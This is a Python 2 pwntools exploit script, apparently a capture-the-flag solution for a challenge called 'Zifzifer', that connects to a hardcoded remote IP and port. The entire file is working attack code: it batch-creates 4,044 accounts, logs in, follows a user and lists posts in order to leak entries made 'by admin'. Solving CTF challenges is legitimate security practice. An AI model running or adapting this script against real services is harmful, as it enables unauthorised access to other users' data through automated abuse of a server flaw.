#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 54.93.40.66 --port 1337
try:
    from pwn import *
except ImportError:
    from pwnwin import *

import time

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '54.93.40.66'
port = int(args.PORT or 1337)

exe = r"E:\CTFs\arkcon\Zifzifer\Zifzifer.exe"

def local():
    return process(exe)

def remote():
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start():
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local()
    else:
        return remote()

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

#context.log_level = "DEBUG"

def create_user(username, password):
    log.info("Creating user '{}' with password '{}'".format(username, password))
    io.sendline("c {} {}".format(username, password))

def create_users_batch(num_users):
    password = "pass"
    log.info("Creating {} users with password '{}'".format(num_users, password))
    io.send(''.join(['c u{0:>04} {1}\r\n'.format(i, password) for i in range(num_users)]))

def login(username, password):
    log.info("Logging in with user '{}' and password '{}'".format(username, password))
    io.sendline("e {} {}".format(username, password))

def follow(username):
    log.info("Following user {}".format(username))
    io.sendline("f {}".format(username))

def list_zifzufs(list_own = True, list_others = False):
    log.info("Listing Zifzufs, List own: {}, List others: {}".format(list_own, list_others))
    triggers = ""
    if list_others:
        triggers += "a"
    if list_own:
        triggers += "i"
    io.sendline("a {}".format(triggers))

io = start()
num_users = 4044

# The server kills the connection if interaction takes too long.
# Instead of creating the users one by one, we batch-create them.
#for i in range(num_users):
#    create_user("u{0:>04}".format(i), "pass")
    
create_users_batch(num_users) 
login('alex', '1234')
follow('u4043')
login('charlie', '3456')
list_zifzufs(True, True)
#io.recvuntil("ArkCon")
io.recvuntil("zifzufs by admin")
print io.recvuntil("zifzufs by")
#print io.recvline()

